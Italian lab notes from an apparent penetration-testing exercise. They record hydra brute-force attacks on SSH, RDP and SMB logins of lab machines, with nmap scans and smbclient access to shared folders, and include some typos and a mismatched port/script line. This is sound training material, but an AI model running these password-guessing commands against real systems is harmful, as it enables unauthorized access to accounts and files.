Esercizio Guida:
	1 Configurazione:	sudo adduser nomeutente -> sudo passwd nomeutente -> sudo usermod -aG sudo nomeutente
	2 Attivazione ssh:	sudo service ssh start
	3 Attacco autenticazione ssh:
		- hydra -L unsername -P password IP_TARGET -t32 ssh -> hydra -V -I -L "usernames_short_100.txt" -P "passwords_short_50.txt" -t32 ssh
		- opzioni: -L lista, -l stringa, -P lista, -p stringa
		- liste utilizzate nei tentativi:
			- usernames_short_100.txt
			- passwords_short_50.txt
Esercizio - Windows 10 - metasploitable:
	1 Servizio: REmote Desktop Protocol - RDP - TEST FALLITO
		2 Configurazione:
			- Setup xrdp, implementazione open-sopurce di microsoft RDP per gestire Remote Desktop Protocol:	sudo apt update -> /
				-> sudo apt install xrdp -> sudo systemctl start xrdp -> sudo systemctl status xrdp
			- Configurazione utente per il test su windows
			- Abilitazione connessione RDP al firewall:	sudo ufw allow 3389/tcp
			- Start servizio xrdp
		3 Attacco:
			- nmap 192.168.50.102 : per identificare le porte aperte
			- scelta della porta 3389 con servizio NetBIOS-SSN
			- nmap -p 389 --script smb-protocols 192.168.50.102 : per ottenere il banner rdp del server per ottenere versione utilizzata
			- hydra -I -V -L usernames -P passwords IP_TARGET t32 rdp
		4 Resoconto:	TEST FALLITO, hydra dice ch ogni combinazione di username/password è buona, ma non è cosi. Esiste solo una combinazione / 
				valida. Il servizio RDP di windows a quuanto pare non accetta tentativi di connessione in parallelo e da errore.
	1.1 Servizio: netbios.ssn - TEST POSITIVO		
		2 Configurazione:
			- creazione utente con password
		3 Attacco:
			- nmap 192.168.50.102 : per identificare le porte aperte
			- scelta della porta 139 con servizio NetBIOS-SSN
			- nmap -p 139 --script smb-protocols 192.168.50.102 : per ottenere il banner smb del server per ottenere versione utilizzata
			- hydra -I -V -l username -P passwords 192.168.50.102 -t4 smb
		4 Connessione:
			- smbclient -L 192.168.50.102 -U username : per ottenere l'albero delle cartelle condivise
			- smbclient //192.168.50.102/""cartella-specifica"" -U username : ottener l'accesso alle cartelle condivise del dispositivo
			
NOTA - servizio SMB
ho notato che con input una lista di username (come in RDP) tutte le combinazioni sono buone (FALSO) e provando con l'username corretto trova la pasdsword corretta. STRANO 